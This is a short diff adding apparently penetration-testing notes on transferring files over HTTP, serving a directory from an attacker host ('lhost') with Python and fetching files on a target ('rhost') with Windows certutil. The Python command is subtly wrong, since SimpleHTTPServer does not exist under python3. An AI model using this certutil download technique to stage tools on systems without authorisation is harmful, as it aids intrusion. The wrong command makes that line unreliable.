@@ -1,0 +1,8 @@
+# using HTTP to transfer files
+
+# start server on lhost
+# files in directory server started are served
+python3 -m SimpleHTTPServer 80
+
+# get files from rhost
+certutil -urlcache -f http://[lhost]/[file]
